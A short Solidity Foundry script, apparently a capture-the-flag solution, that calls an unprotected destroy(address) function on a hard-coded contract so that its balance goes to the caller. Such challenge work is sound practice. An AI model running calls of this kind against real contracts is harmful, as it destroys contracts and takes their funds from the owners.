// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "forge-std/Test.sol";

contract Solve is Script, Test {
  address target = address(0xAd81d8601aF1956cc2161a7E29580d411cA5B20a);

  function run() public {
    vm.startBroadcast();

    (bool success, ) = target.call(abi.encodeWithSignature("destroy(address)", msg.sender));
    require(success, "Failed to solve");

    vm.stopBroadcast();
  }
}
